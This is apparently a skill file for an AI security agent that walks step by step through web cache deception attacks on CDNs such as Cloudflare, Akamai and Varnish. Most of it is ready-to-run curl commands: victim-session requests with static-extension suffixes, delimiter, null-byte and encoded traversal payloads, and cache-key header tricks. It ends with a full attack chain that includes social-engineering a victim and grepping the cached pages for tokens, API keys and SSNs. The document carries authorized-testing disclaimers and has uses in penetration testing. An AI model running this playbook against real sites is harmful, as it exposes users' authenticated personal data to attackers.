---
name: performing-web-cache-deception-attack
description: Executes web cache deception attacks by exploiting path normalization discrepancies between CDN/reverse-proxy caching layers (Cloudflare, Akamai, Varnish, Nginx) and origin servers to cache and retrieve sensitive authenticated content.
subdomain: web-application-security
facing: source
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1078.004
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
upstream: performing-web-cache-deception-attack@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Codegraph (do this first)
1. `codegraph_explore "static file serving and cache key"` — locate the file handler and what makes a cache key; `callers` for the path into it. Output = read.
2. Changing shared code: `codegraph callers <fn>` + `codegraph impact <fn>` before editing. One root-cause fix, owning layer, every call site covered.
3. Tests: `git diff --name-only | codegraph affected --stdin`. None at the seam = add one.
4. Before "unused"/rename/delete: `codegraph sync`, then grep. No graph yet: grep for the sinks above.
Any "grep/search the codebase" step below → use these calls instead; keep grep for strings, config and dynamic refs.

## Prerequisites

- Understanding of HTTP caching mechanisms (Cache-Control, Vary, Age headers)
- Knowledge of CDN path normalization and cache key construction
- Burp Suite for intercepting and crafting requests
- Two browser sessions (authenticated victim and unauthenticated attacker)
- Understanding of URL path parsing differences across technologies
- Familiarity with common CDN platforms (Cloudflare, Akamai, Fastly, AWS CloudFront)

## Workflow

### Step 1 — Identify Caching Layer and Behavior

```bash
# Determine if a caching layer exists
curl -I http://target.com/account/profile
# Look for: X-Cache, CF-Cache-Status, Age, Via, X-Varnish headers

# Check caching rules for static extensions
curl -I "http://target.com/static/style.css"
# Look for: X-Cache: HIT, CF-Cache-Status: HIT, Age: >0

# Identify which extensions are cached
for ext in css js png jpg gif svg ico woff woff2 pdf; do
  echo -n "$ext: "
  curl -sI "http://target.com/test.$ext" | grep -i "x-cache\|cf-cache"
done
```

### Step 2 — Test Path-Based Cache Deception

```bash
# Classic web cache deception: append static extension to dynamic URL
# Victim visits: http://target.com/account/profile/nonexistent.css
# If origin returns profile page and CDN caches it based on .css extension:

# Step 1: As victim (authenticated), visit:
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/anything.css"

# Step 2: As attacker (unauthenticated), request same URL:
curl "http://target.com/account/profile/anything.css"
# If victim's profile data is returned, cache deception is confirmed

# Test various extensions
for ext in css js png jpg svg ico woff2; do
  curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/x.$ext" -o /dev/null
  sleep 2
  echo -n "$ext: "
  curl -s "http://target.com/account/profile/x.$ext" | head -c 200
  echo
done
```

### Step 3 — Exploit Delimiter-Based Discrepancies

```bash
# Use path delimiters that CDN and origin interpret differently
# Semicolon delimiter (ignored by CDN, processed by origin)
curl -b "session=VICTIM" "http://target.com/account/profile;anything.css"

# Encoded characters
curl -b "session=VICTIM" "http://target.com/account/profile%2Fstatic.css"
curl -b "session=VICTIM" "http://target.com/account/profile%3Bstyle.css"

# Null byte injection
curl -b "session=VICTIM" "http://target.com/account/profile%00.css"

# Fragment identifier abuse
curl -b "session=VICTIM" "http://target.com/account/profile%23.css"

# Dot segment normalization
curl -b "session=VICTIM" "http://target.com/static/..%2Faccount/profile"
```

### Step 4 — Test Normalization Discrepancies

```bash
# Path traversal normalization differences
# CDN normalizes: /account/profile/../static/x.css -> /static/x.css (cached)
# Origin sees: /account/profile (dynamic page returned)

curl -b "session=VICTIM" "http://target.com/static/../account/profile"
# CDN may cache as /account/profile if it normalizes differently than origin

# Encoded path traversal
curl -b "session=VICTIM" "http://target.com/static/..%2faccount/profile"

# Case sensitivity differences
curl -b "session=VICTIM" "http://target.com/account/profile/X.CSS"

# Double-encoded paths
curl -b "session=VICTIM" "http://target.com/account/profile/%252e%252e/static.css"
```

### Step 5 — Exploit Cache Key Manipulation

```bash
# Identify cache key components
# CDN may use: scheme + host + path (excluding query string)
# Test if query string affects caching

curl -b "session=VICTIM" "http://target.com/account/profile?cachebuster=123.css"

# Test if the CDN uses the full path or normalized path as cache key
curl -b "session=VICTIM" "http://target.com/account/profile/./style.css"
curl "http://target.com/account/profile/./style.css"  # Check if cached

# Header-based cache key manipulation
curl -b "session=VICTIM" -H "X-Original-URL: /account/profile" \
  "http://target.com/static/cached.css"
```

### Step 6 — Verify and Document Attack

```bash
# Full attack chain:
# 1. Craft malicious URL: http://target.com/account/profile/x.css
# 2. Send URL to victim (via social engineering, email, etc.)
# 3. Victim clicks link while authenticated
# 4. CDN caches the authenticated response
# 5. Attacker requests the same URL without authentication
# 6. CDN serves cached authenticated content to attacker

# Verify cache status
curl -I "http://target.com/account/profile/x.css"
# Confirm: X-Cache: HIT or CF-Cache-Status: HIT

# Check what sensitive data is exposed
curl -s "http://target.com/account/profile/x.css" | grep -i "email\|name\|token\|api_key\|ssn"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Cache Deception | Tricking CDN into caching authenticated dynamic content as static resource |
| Path Normalization | How CDN and origin differently resolve path segments (../, ;, encoded chars) |
| Cache Key | Identifier CDN uses to store/retrieve cached responses (typically URL path) |
| Static Extension Trick | Appending .css/.js/.png to dynamic URLs to trigger caching behavior |
| Delimiter Discrepancy | Characters (;, ?, #) interpreted differently by cache vs. origin server |
| Cache Poisoning vs Deception | Poisoning modifies cache for all users; deception caches specific victim data |
| Vary Header | HTTP header controlling which request attributes affect cache key |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for crafting cache deception requests |
| curl | Command-line testing of cache behavior and response headers |
| Web Cache Vulnerability Scanner | Automated tool for detecting cache deception/poisoning |
| Param Miner | Burp extension for discovering unkeyed cache parameters |
| Cloudflare Diagnostics | Analyzing CF-Cache-Status and cf-ray headers |
| Varnish CLI | Direct cache inspection for Varnish-based setups |

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-web-cache-deception-attack
